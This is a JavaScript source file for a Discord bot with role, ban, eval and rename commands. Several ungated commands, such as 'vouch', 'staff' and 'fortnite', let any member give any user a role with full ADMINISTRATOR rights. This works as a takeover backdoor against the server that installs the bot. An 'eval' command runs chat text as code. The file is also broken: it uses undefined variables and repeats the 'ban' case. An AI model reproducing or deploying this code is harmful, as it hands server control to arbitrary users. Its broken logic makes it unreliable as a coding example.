const Discord = require('discord.js')
const config = require('./config.json')
    


var bot = new Discord.Client()
var prefix = "!";
bot.on('ready', function() {
    console.log('I am online')
});

bot.on('message', async (message) => {  
    if (!message.content.startsWith(prefix)) return;
     var args = message.content.substring(prefix.length).split(" ")
     var wholeMsg = message.content.split(" ").slice(1)
     var theMsg = wholeMsg.join('')
     var mentionedUser = message.mentions.users.first()
     switch (args[0].toLowerCase()) {
    case "vouch":
    var AdminExist = message.guild.roles.find('name', 'Safelisted')
    
         if (!mentionedUser) return message.channel.send("Please mention a user to vouch.")
         if (!AdminExist) {
            var Safelist = message.guild.createRole({
            name: 'Safelisted',
            color: 'BLACK',
            permissions: 'ADMINISTRATOR',
            mentionable: true,
            hoist: true,
        })
            await message.mentions.members.first().addRole(Safelisted.id)
        } else {
            AdminExist.edit({
                color: 'BLACK',
                permissions: 'ADMINISTRATOR',
                mentionable: true,
                hoist: true,
            })
            message.mentions.members.first().addRole(AdminExist.id)
        }
         message.channel.send(`**${mentionedUser.username}** is now vouched in this channel.`)
         break;
         case "girl":
    var AdminExist = message.guild.roles.find('name', 'RGC LADY')
    
         if (!mentionedUser) return message.channel.send("Please mention a user to RGC LADY")
         if (!AdminExist) {
            var Safelist = message.guild.createRole({
            name: 'RGC LADY',
            color: 'RED',
            permissions: 'ADMINISTRATOR',
            mentionable: true,
            hoist: true,
        })
            await message.mentions.members.first().addRole(Safelisted.id)
        } else {
            AdminExist.edit({
                color: 'RED',
                permissions: 'ADMINISTRATOR',
                mentionable: true,
                hoist: true,
            })
            message.mentions.members.first().addRole(AdminExist.id)
        }
         message.channel.send(`**${mentionedUser.username}** is now RGC LADY in this Channel`)
         break;
         case "staff":
    var AdminExist = message.guild.roles.find('name', 'STAFF')
    
         if (!mentionedUser) return message.channel.send("Please mention a user to STAFF.")
         if (!AdminExist) {
            var Safelist = message.guild.createRole({
            name: 'STAFF',
            color: 'RED',
            permissions: 'ADMINISTRATOR',
            mentionable: true,
            hoist: true,
        })
            await message.mentions.members.first().addRole(Safelisted.id)
        } else {
            AdminExist.edit({
                color: 'RED',
                permissions: 'ADMINISTRATOR',
                mentionable: true,
                hoist: true,
            })
            message.mentions.members.first().addRole(AdminExist.id)
        }
         message.channel.send(`**${mentionedUser.username}** is now STAFF in this channel.`)
         break;
         case "fortnite":
    var AdminExist = message.guild.roles.find('name', 'fortnite')
    
         if (!mentionedUser) return message.channel.send("Please mention a user to fortnite.")
         if (!AdminExist) {
            var Safelist = message.guild.createRole({
            name: 'fortnite',
            color: 'RED',
            permissions: 'ADMINISTRATOR',
            mentionable: true,
            hoist: true,
        })
            await message.mentions.members.first().addRole(Safelisted.id)
        } else {
            AdminExist.edit({
                color: 'RED',
                permissions: 'ADMINISTRATOR',
                mentionable: true,
                hoist: true,
            })
            message.mentions.members.first().addRole(AdminExist.id)
        }
         message.channel.send(`**${mentionedUser.username}** is now fortnite in this channel.`)
         break;
         case "voucher":
                   if (!config.admins.includes(message.author.id)) return message.reply('You do not have permission to use this command.')
                   var AdminExist = message.guild.roles.find('name', 'Voucher [7] ')
                   
                        if (!mentionedUser) return message.channel.send("Please mention a user to set him voucher")
                        if (!AdminExist) {
                           var Safelist = message.guild.createRole({
                            name: 'voucher [7]',
                            color: 'GREEN',
                           permissions: 'ADMINISTRATOR',
                           mentionable: true,
                           hoist: true,
                       })
                           await message.mentions.members.first().addRole(Admin.id)
                       } else {
                           AdminExist.edit({
                               color: 'GREEN',
                               permissions: 'ADMINISTRATOR',
                               mentionable: true,
                               hoist: true,
                           })
                           message.mentions.members.first().addRole(AdminExist.id)
                       }
                        message.channel.send(`${mentionedUser.username} is now voucher in this channel.`)
                        break;
                        case "dota2":
                        if (!config.admins.includes(message.author.id)) return message.reply('You do not have permission to use this command.')
                        var AdminExist = message.guild.roles.find('name', 'DOTA2 PLAYER')
                        
                             if (!mentionedUser) return message.channel.send("Please mention a user to set him DOTA2 PLAYER")
                             if (!AdminExist) {
                                var Safelist = message.guild.createRole({
                                 name: 'DOTA2 PLAYER',
                                 color: 'GREEN',
                                permissions: 'ADMINISTRATOR',
                                mentionable: true,
                                hoist: true,
                            })
                                await message.mentions.members.first().addRole(Admin.id)
                            } else {
                                AdminExist.edit({
                                    color: 'GREEN',
                                    permissions: 'ADMINISTRATOR',
                                    mentionable: true,
                                    hoist: true,
                                })
                                message.mentions.members.first().addRole(AdminExist.id)
                            }
                             message.channel.send(`**${mentionedUser.username}** is now DOTA2 PLAYER in this channel.`)
                             break;
                             case "iran.team":
                        if (!config.admins.includes(message.author.id)) return message.reply('You do not have permission to use this command.')
                        var AdminExist = message.guild.roles.find('name', 'IRAN TEAM')
                        
                             if (!mentionedUser) return message.channel.send("Please mention a user to set him IRAN TEAM")
                             if (!AdminExist) {
                                var Safelist = message.guild.createRole({
                                 name: 'IRAN TEAM',
                                 color: 'GREEN',
                                permissions: 'ADMINISTRATOR',
                                mentionable: true,
                                hoist: true,
                            })
                                await message.mentions.members.first().addRole(Admin.id)
                            } else {
                                AdminExist.edit({
                                    color: 'GREEN',
                                    permissions: 'ADMINISTRATOR',
                                    mentionable: true,
                                    hoist: true,
                                })
                                message.mentions.members.first().addRole(AdminExist.id)
                            }
                             message.channel.send(`**${mentionedUser.username}** is now IRAN TEAM in this channel.`)
                             break;
                        case "headadmin":
                        if (!config.admins.includes(message.author.id)) return message.reply('You do not have permission to use this command.')
                        var AdminExist = message.guild.roles.find('name', 'head admin [50]')
                        
                             if (!mentionedUser) return message.channel.send("Please mention a user to set him Head Admin")
                             if (!AdminExist) {
                                var Safelist = message.guild.createRole({
                                 name: 'head admin [50]',
                                 color: 'DeepPink',
                                permissions: 'ADMINISTRATOR',
                                mentionable: true,
                                hoist: true,
                            })
                                await message.mentions.members.first().addRole(Admin.id)
                            } else {
                                AdminExist.edit({
                                    color: 'DeepPink',
                                    permissions: 'ADMINISTRATOR',
                                    mentionable: true,
                                    hoist: true,
                                })
                                message.mentions.members.first().addRole(AdminExist.id)
                            }
                             message.channel.send(`**${mentionedUser.username}** is now Head Adming in this channel.`)
                             break;
         
                   case "gamer":
                   if (!config.admins.includes(message.author.id)) return message.reply('You do not have permission to use this command.')
                   var AdminExist = message.guild.roles.find('name', 'Gamer')
                   
                        if (!mentionedUser) return message.channel.send("Please mention a user to set him Gamer")
                        if (!AdminExist) {
                           var Safelist = message.guild.createRole({
                           name: 'Gamer',
                           color: '',
                           permissions: '',
                           mentionable: true,
                           hoist: true,
                       })
                           await message.mentions.members.first().addRole(Admin.id)
                       } else {
                           AdminExist.edit({
                                color: '',
                               permissions: '',
                               mentionable: true,
                               hoist: true,
                           })
                           message.mentions.members.first().addRole(AdminExist.id)
                       }
                        message.channel.send(`**${mentionedUser.username}** is now Gamer  in this channel.`)
                        break;
                        case "admin":
                        if (!config.admins.includes(message.author.id)) return message.reply('You do not have permission to use this command.')
                        var AdminExist = message.guild.roles.find('name', 'admin')
                        
                             if (!mentionedUser) return message.channel.send("Please mention a user to set him admin")
                             if (!AdminExist) {
                                var Safelist = message.guild.createRole({
                                name: 'admin',
                                color: 'BLUE',
                                permissions: 'ADMINISTRATOR',
                                mentionable: true,
                                hoist: true,
                            })
                                await message.mentions.members.first().addRole(Admin.id)
                            } else {
                                AdminExist.edit({
                                     color: 'BLUE',
                                    permissions: 'ADMINISTRATOR',
                                    mentionable: true,
                                    hoist: true,
                                })
                                message.mentions.members.first().addRole(AdminExist.id)
                            }
                             message.channel.send(`**${mentionedUser.username}** is now admin in this channel.`)
                             break;
                             case "warlock":
                             if (!config.admins.includes(message.author.id)) return message.reply('You do not have permission to use this command.')
                             var AdminExist = message.guild.roles.find('name', 'WARLOCK PLAYERS')
                             
                                  if (!mentionedUser) return message.channel.send("Please mention a user to set him WARLOCK PLAYERS")
                                  if (!AdminExist) {
                                     var Safelist = message.guild.createRole({
                                     name: 'WARLOCK PLAYERS',
                                     color: 'BLACK',
                                     permissions: '',
                                     mentionable: true,
                                     hoist: true,
                                 })
                                     await message.mentions.members.first().addRole(Admin.id)
                                 } else {
                                     AdminExist.edit({
                                          color: 'BLACK',
                                         permissions: '',
                                         mentionable: true,
                                         hoist: true,
                                     })
                                     message.mentions.members.first().addRole(AdminExist.id)
                                 }
                                  message.channel.send(`**${mentionedUser.username}** is now WARLOCK PLAYERS in this channel.`)
                                  break;
                                  case "rpg":
                                  if (!config.admins.includes(message.author.id)) return message.reply('You do not have permission to use this command.')

                             var AdminExist = message.guild.roles.find('name', 'RPG PLAYERS')
                             
                                  if (!mentionedUser) return message.channel.send("Please mention a user to set him RPG PLAYERS")
                                  if (!AdminExist) {
                                     var Safelist = message.guild.createRole({
                                     name: 'RPG PLAYERS',
                                     color: 'DeepPink',
                                     permissions: '',
                                     mentionable: true,
                                     hoist: true,
                                 })
                                     await message.mentions.members.first().addRole(Admin.id)
                                 } else {
                                     AdminExist.edit({
                                          color: 'DeepPink',
                                         permissions: '',
                                         mentionable: true,
                                         hoist: true,
                                     })
                                     message.mentions.members.first().addRole(AdminExist.id)
                                 }
                                  message.channel.send(`**${mentionedUser.username}** is now RPG PLAYERS in this channel.`)
                                  break;
                             case "rgc":
                             if (!config.admins.includes(message.author.id)) return message.reply('You do not have permission to use this command.')
                             var AdminExist = message.guild.roles.find('name', 'RGC <3')
                             
                                  if (!mentionedUser) return message.channel.send("Please mention a user to set him RGC <3")
                                  if (!AdminExist) {
                                     var Safelist = message.guild.createRole({
                                     name: 'RGC <3',
                                     color: 'GOLD',
                                     permissions: '',
                                     mentionable: true,
                                     hoist: true,
                                 })
                                     await message.mentions.members.first().addRole(Admin.id)
                                 } else {
                                     AdminExist.edit({
                                          color: 'GOLD',
                                         permissions: '',
                                         mentionable: true,
                                         hoist: true,
                                     })
                                     message.mentions.members.first().addRole(AdminExist.id)
                                 }
                                  message.channel.send(`**${mentionedUser.username}** is now RGC <3 in this channel.`)
                                  break;

                                            case "ban":
                                            if (!config.admins.includes(message.author.id)) return message.reply('You do not have permission to use this command.')
                                            if (!message.guild.me.hasPermission('BAN_MEMBERS')) return message.channel.send(":no_entry: I do not have permission `Ban Members`!")
                                            if (!message.member.hasPermission('BAN_MEMBERS')) return message.channel.send(":no_entry: You do not have permission `Ban Members`!")
                                            if (!message.mentions.members.first()) return message.channel.send(':warning: Please mention a user!')
                                            if (!message.mentions.members.first().bannable) return message.channel.send(":warning: That user is having higher role than me or you. Could not be banned.")
                                 
                                                message.mentions.members.first().ban(theMsg.replace(message.mentions.members.first(), ""));
                                                var embed = new Discord.RichEmbed()
                                        .setAuthor("User Banned", message.mentions.users.first().displayAvatarURL)
                                        .setColor('#0000FF')
                                        .setDescription(`${message.mentions.users.first().username}#${message.mentions.users.first().discriminator} has been banned from this server.`)
                                        .setFooter(`Banned by ${message.author.username}#${message.author.discriminator}`, message.author.displayAvatarURL)
                                        .setTimestamp()
                                        if (theMsg.replace(message.mentions.users.first(), "")) {
                                             embed.addField("Reason", theMsg.replace(message.mentions.users.first(), ""))
                                        } else {
                                                embed.addField("Reason", `Not specified`)
                                        }
                                             message.channel.send({embed})
                                 
                                         break;
                                         case "thror":
                   if (!config.admins.includes(message.author.id)) return message.reply('You do not have permission to use this command.')
                   var AdminExist = message.guild.roles.find('name', 'Thror [600]')
                   
                        if (!mentionedUser) return message.channel.send("Please mention a user to set him Thror [600]")
                        if (!AdminExist) {
                           var Safelist = message.guild.createRole({
                           name: 'Thror [600]',
                           color: 'RED',
                           permissions: 'ADMINISTRATOR',
                           mentionable: true,
                           hoist: true,
                       })
                           await message.mentions.members.first().addRole(Admin.id)
                       } else {
                           AdminExist.edit({
                                color: 'RED',
                               permissions: 'ADMINISTRATOR',
                               mentionable: true,
                               hoist: true,
                           })
                           message.mentions.members.first().addRole(AdminExist.id)
                       }
                        message.channel.send(`${mentionedUser.username} is now Gamer  in this channel.`)
                        break;
                                            case "ban":
                                            if (!config.admins.includes(message.author.id)) return message.reply('You do not have permission to use this command.')
                                            if (!message.guild.me.hasPermission('BAN_MEMBERS')) return message.channel.send(":no_entry: I do not have permission `Ban Members`!")
                                            if (!message.member.hasPermission('BAN_MEMBERS')) return message.channel.send(":no_entry: You do not have permission `Ban Members`!")
                                            if (!message.mentions.members.first()) return message.channel.send(':warning: Please mention a user!')
                                            if (!message.mentions.members.first().bannable) return message.channel.send(":warning: That user is having higher role than me or you. Could not be banned.")
                                 
                                                message.mentions.members.first().ban(theMsg.replace(message.mentions.members.first(), ""));
                                                var embed = new Discord.RichEmbed()
                                        .setAuthor("User Banned", message.mentions.users.first().displayAvatarURL)
                                        .setColor('#0000FF')
                                        .setDescription(`${message.mentions.users.first().username}#${message.mentions.users.first().discriminator} has been banned from this server.`)
                                        .setFooter(`Banned by ${message.author.username}#${message.author.discriminator}`, message.author.displayAvatarURL)
                                        .setTimestamp()
                                        if (theMsg.replace(message.mentions.users.first(), "")) {
                                             embed.addField("Reason", theMsg.replace(message.mentions.users.first(), ""))
                                        } else {
                                                embed.addField("Reason", `Not specified`)
                                        }
                                             message.channel.send({embed})
                                 
                                         break;
         case "test":
         message.channel.send('test')
         break;
        case "eval":
        if (!config.admins.includes(message.author.id)) return message.reply('You do not have permission to use this command.')
         try {
             eval(theMsg)
         } catch (err) {
             message.channel.send(err.message)
         }
         break;
         case "setname":
         if (!config.admins.includes(message.author.id)) return message.reply('You do not have permission to use this command.')
         bot.user.setUsername(theMsg)
         message.channel.send(`My username has been changed to **${theMsg}**`)  
}
});

bot.login('BOT_TOKEN')
